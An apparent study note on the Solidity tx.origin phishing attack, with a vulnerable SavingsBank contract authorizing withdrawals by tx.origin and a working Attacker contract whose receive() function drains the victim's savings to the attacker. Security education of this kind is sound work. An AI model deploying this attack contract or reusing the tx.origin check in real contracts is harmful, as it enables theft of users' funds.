<h2>tx.origin Phishing Exploit</h2>
<div>
<p>
In this exploit, the attacker abuses tx.origin. What tx.origin does is it stores the address of the original sender, while msg.sender stores the address of the caller of the function. 
So if EOA calls his contract A and then from contract A it calls contact B, then tx.origin is the EOA but msg.sender is contract A.
</p>
<p>
Now what the attacker does is he sets up a receive function that then calls the contact B withdraw all function. And what ends up happening is that it passes the check that tx.origin is owner of the funds in contact B and sends the funds to the attacker specified in the parameter _recipient as shown in code below.
</p>
<p>
What needs to happen for the attacker is that his victim has to send some funds to his Contract A AND also has to have some funds in Contact B. So there is a lot that has to go in his way, it's not like other exploits where he just does everything in few minutes, calls a bunch of function and he is done. No he has to passively wait for someone to get trapped by sending funds to his Attacker Contract.
</p>
<p>
I understand that this might work for some non techincal people and especially for the advertisements and fake "I'll double your coins" schemes but in reality, having a bit of know how and you really need to have know how if you're in crypto then it shouldn't really cause a threat in my opinion. At this points it's the stupidity of the victim for falling for such a scam I would say than anything else.

Contract B
<pre><code>contract SavingsBank {
    address public owner;
    constructor(){
        owner = msg.sender;
    }
    function deposit() public payable {
       // to receive ether.
    }
   
    function withdrawAll(address _recipient) public {
        require(tx.origin == owner);
        (bool sent,) = _recipient.call{value:address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
</code></pre>

Contract A - Attacker

<pre><code>import "./savingsBank.sol";
contract Attacker {
    SavingsBank public savingsbank;
    address attacker;
    constructor(address _savingsBankAddress, address _attackerAddress) {
    savingsbank = SavingsBank(_savingsBankAddress);
    attacker = _attackerAddress;
    }
    receive() external payable{
        savingsbank.withdrawAll(attacker);
    }
    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    } 
}
</code></pre>

<a href="https://blog.finxter.com/tx-origin-phishing-attack-smart-contract-security-series-part-4/" target="_blank" rel="noopener noreferrer">link</a>
</p>
</div>